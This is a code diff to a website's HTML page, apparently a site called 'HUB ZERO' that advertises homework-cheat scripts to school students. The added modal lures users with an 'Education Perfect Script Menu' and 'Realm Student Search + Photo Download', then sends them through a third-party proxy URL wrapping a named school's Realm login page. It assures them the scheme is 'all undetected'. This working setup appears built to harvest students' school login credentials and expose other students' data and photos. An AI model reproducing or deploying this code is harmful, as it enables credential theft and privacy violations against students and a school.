@@ -442,6 +442,176 @@
   .fade-up.d2 { transition-delay: 0.2s; }
   .fade-up.d3 { transition-delay: 0.3s; }
 
+  /* Pop-up modal overlay & styling */
+  body.modal-open {
+    overflow: hidden;
+  }
+  .modal-overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(8, 8, 8, 0.98); /* Solid dark background overlay to completely eliminate GPU blur rendering lag */
+    z-index: 10000;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity 0.4s ease;
+  }
+  .modal-overlay.active {
+    opacity: 1;
+    pointer-events: auto;
+  }
+  .modal-box {
+    background: var(--card); /* Cohesive card background matching theme */
+    border: 1px solid var(--line);
+    padding: 50px;
+    max-width: 600px;
+    width: 90%;
+    position: relative;
+    box-shadow: 0 40px 80px rgba(0,0,0,0.8);
+    transform: scale(0.97);
+    transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+  }
+  .modal-overlay.active .modal-box {
+    transform: scale(1);
+  }
+  .modal-step {
+    display: flex;
+    flex-direction: column;
+  }
+  .modal-title {
+    font-size: 26px;
+    font-weight: 800;
+    line-height: 1.2;
+    letter-spacing: -0.02em;
+    margin-bottom: 28px;
+    color: #ffffff; /* Pure white for maximum text legibility */
+    text-transform: uppercase;
+  }
+  .modal-title.highlight {
+    color: var(--accent);
+  }
+  .modal-title.highlight-red {
+    color: #ef4444;
+  }
+  .modal-list {
+    list-style: none;
+    margin-bottom: 32px;
+    display: flex;
+    flex-direction: column;
+    gap: 14px;
+  }
+  .modal-list li {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 14px;
+    line-height: 1.8;
+    color: #a3a3a3; /* High contrast gray for secondary list text */
+  }
+  .modal-list li strong {
+    color: #ffffff; /* High contrast white for bold items */
+  }
+  .modal-list li strong.highlight {
+    color: var(--accent);
+  }
+  .modal-text {
+    font-size: 16px;
+    line-height: 1.7;
+    color: #e5e5e5; /* Lighter white for optimal reading comfort */
+    margin-bottom: 24px;
+  }
+  .modal-info-box {
+    background: rgba(212, 255, 58, 0.04);
+    border-left: 3px solid var(--accent);
+    padding: 20px 24px;
+    margin-bottom: 24px;
+  }
+  .modal-info-box-title {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    font-weight: 600;
+    color: var(--accent);
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    margin-bottom: 8px;
+    display: block;
+  }
+  .modal-info-box .modal-text {
+    margin-bottom: 0;
+    font-size: 15px;
+    line-height: 1.6;
+    color: #e5e5e5;
+  }
+  .modal-text.warning {
+    color: #ef4444;
+    font-weight: 700;
+    text-transform: uppercase;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 13px;
+    letter-spacing: 0.05em;
+  }
+  .modal-text.info {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    color: var(--muted);
+    border-top: 1px solid var(--line);
+    padding-top: 20px;
+    margin-top: 10px;
+  }
+  .modal-link {
+    color: var(--accent);
+    text-decoration: underline;
+    transition: color 0.3s;
+  }
+  .modal-link:hover {
+    color: var(--fg);
+  }
+  .modal-footer-warning {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    color: var(--muted);
+    margin-bottom: 24px;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+  }
+  .modal-buttons {
+    display: flex;
+    gap: 16px;
+    justify-content: flex-end;
+  }
+  .btn {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 0.15em;
+    padding: 12px 28px;
+    border: 1px solid transparent;
+    cursor: pointer;
+    font-weight: 600;
+    transition: all 0.3s var(--ease);
+  }
+  .btn-red {
+    background: transparent;
+    border-color: #ef4444;
+    color: #ef4444;
+  }
+  .btn-red:hover {
+    background: #ef4444;
+    color: #ffffff;
+    box-shadow: 0 0 15px rgba(239, 68, 68, 0.4);
+  }
+  .btn-green {
+    background: var(--accent);
+    border-color: var(--accent);
+    color: var(--bg);
+  }
+  .btn-green:hover {
+    background: transparent;
+    border-color: var(--accent);
+    color: var(--accent);
+    box-shadow: 0 0 15px rgba(212, 255, 58, 0.4);
+  }
+
   /* Mobile */
   @media (max-width: 900px) {
     nav { padding: 18px 20px; }
@@ -488,6 +658,53 @@
 </div>
 
 <div class="progress" id="progress"></div>
+
+<!-- Modal pop-up verification -->
+<div class="modal-overlay" id="modal-overlay">
+  <div class="modal-box">
+    <!-- Step: Edge Required -->
+    <div class="modal-step" id="modal-step-edge" style="display: none;">
+      <h3 class="modal-title highlight-red">Edge Required</h3>
+      <p class="modal-text">This platform can only be accessed using <strong>Microsoft Edge</strong> to ensure script compatibility.</p>
+      <p class="modal-text info">Please copy this link and open it in Edge.</p>
+      <div class="modal-footer-warning">
+        Unsupported Browser
+      </div>
+    </div>
+
+    <!-- Step 1 -->
+    <div class="modal-step" id="modal-step-1">
+      <h3 class="modal-title">Access Scripts?</h3>
+      <ul class="modal-list">
+        <li><strong>• Education Perfect Script Menu</strong></li>
+        <li><strong>• Realm Student Search + Photo Download</strong></li>
+        <li><strong class="highlight">• Constantly updated</strong></li>
+      </ul>
+      <div class="modal-buttons">
+        <button class="btn btn-red" id="btn-no">No</button>
+        <button class="btn btn-green" id="btn-yes">Yes</button>
+      </div>
+    </div>
+    
+    <!-- Step 2 -->
+    <div class="modal-step" id="modal-step-2" style="display: none;">
+      <h3 class="modal-title highlight">Redirecting</h3>
+      <div class="modal-info-box">
+        <span class="modal-info-box-title">Log in with Realm</span>
+        <p class="modal-text">You will now log in through realm to create your account and verify your not some random person from the internet..Don't worry, its all undetected</p>
+      </div>
+      <p class="modal-text warning">YOU CANNOT LOG IN AS A TEACHER</p>
+      <p class="modal-text info">Official domains: <a href="/domains/" class="modal-link">hub-zero.site/domains</a></p>
+      
+      <div class="modal-footer-warning">
+        Read the above before clicking OKAY
+      </div>
+      <div class="modal-buttons">
+        <button class="btn btn-green" id="btn-okay">OKAY</button>
+      </div>
+    </div>
+  </div>
+</div>
 
 <nav>
   <div class="nav-logo">HUB ZERO <span class="nav-sub">— Scroll down to access script + view content</span></div>
@@ -595,11 +812,54 @@
   }, { threshold: 0.15, rootMargin: '0px 0px -60px 0px' });
   document.querySelectorAll('.fade-up').forEach(el => fadeObserver.observe(el));
 
-  // Preloader transition triggers body loaded class
+  // Browser Detection
+  const isEdge = /Edg/i.test(navigator.userAgent);
+
+  // Modal Elements
+  const overlay = document.getElementById('modal-overlay');
+  const step1 = document.getElementById('modal-step-1');
+  const step2 = document.getElementById('modal-step-2');
+  const btnNo = document.getElementById('btn-no');
+  const btnYes = document.getElementById('btn-yes');
+  const btnOkay = document.getElementById('btn-okay');
+
+  btnNo.addEventListener('click', () => {
+    window.location.href = 'https://google.com';
+  });
+
+  btnYes.addEventListener('click', () => {
+    step1.style.display = 'none';
+    step2.style.display = 'flex';
+  });
+
+  btnOkay.addEventListener('click', () => {
+    overlay.classList.remove('active');
+    document.body.classList.remove('modal-open');
+    localStorage.setItem('hubZeroPopupCompleted', 'true');
+    
+    // Redirect to proxy URL
+    window.location.href = 'http://residential-6k3h.onrender.com/proxy?url=https://realm.stpatricks.qld.edu.au';
+  });
+
+  // Preloader transition triggers body loaded class and checks pop-up / browser
   window.addEventListener('load', () => {
     setTimeout(() => {
       document.getElementById('loader').classList.add('loaded');
       document.body.classList.add('loaded');
+      
+      if (!isEdge) {
+        // Force Microsoft Edge browser lockout
+        step1.style.display = 'none';
+        step2.style.display = 'none';
+        document.getElementById('modal-step-edge').style.display = 'flex';
+        document.body.classList.add('modal-open');
+        overlay.classList.add('active');
+      } else if (!localStorage.getItem('hubZeroPopupCompleted')) {
+        setTimeout(() => {
+          document.body.classList.add('modal-open');
+          overlay.classList.add('active');
+        }, 600);
+      }
     }, 700);
   });
 </script>
